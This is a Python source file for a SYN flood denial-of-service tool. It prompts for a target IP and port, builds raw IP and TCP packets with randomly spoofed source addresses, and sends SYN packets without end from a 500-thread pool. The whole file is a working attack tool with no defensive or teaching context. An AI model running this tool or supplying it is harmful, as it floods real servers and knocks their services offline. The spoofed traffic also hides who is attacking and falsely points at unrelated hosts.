import os
import sys
import socket
import random
from concurrent.futures import ThreadPoolExecutor

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.ip_header import IPHeader
from core.tcp_header import TCPFlags, TCPHeader

packets_sent = 0


def random_ip() -> str:
    return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"


def flood_packet(target_ip: str, target_port: int, sock: socket.socket) -> None:
    global packets_sent

    src_ip = random_ip()
    src_port = random.randint(1024, 65535)

    tcp_obj = TCPHeader(src_port=src_port, dst_port=target_port, flags=TCPFlags.SYN)
    tcp_header = tcp_obj.build(src_ip, target_ip)

    ip_obj = IPHeader(src=src_ip, dst=target_ip, ttl=random.randint(64, 128))
    ip_header = ip_obj.build(payload_length=len(tcp_header))

    packet = ip_header + tcp_header

    try:
        sock.sendto(packet, (target_ip, 0))
        packets_sent += 1
        if packets_sent % 1000 == 0:
            print(f"[*] Packets sent: {packets_sent}")
    except Exception:
        pass


def main() -> None:
    target_ip = input("Target IP: ").strip()
    target_port = input("Target port [default: 80]: ").strip()
    target_port = int(target_port) if target_port else 80

    print(f"\n[!] Starting SYN flood on {target_ip}:{target_port}")
    print(f"[!] Press Ctrl+C to stop\n")

    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    try:
        with ThreadPoolExecutor(max_workers=500) as executor:
            while True:
                executor.submit(flood_packet, target_ip, target_port, sock)
    except KeyboardInterrupt:
        print(f"\n[*] Flood stopped.")
        print(f"[*] Total packets sent: {packets_sent}")
        sock.close()


if __name__ == '__main__':
    main()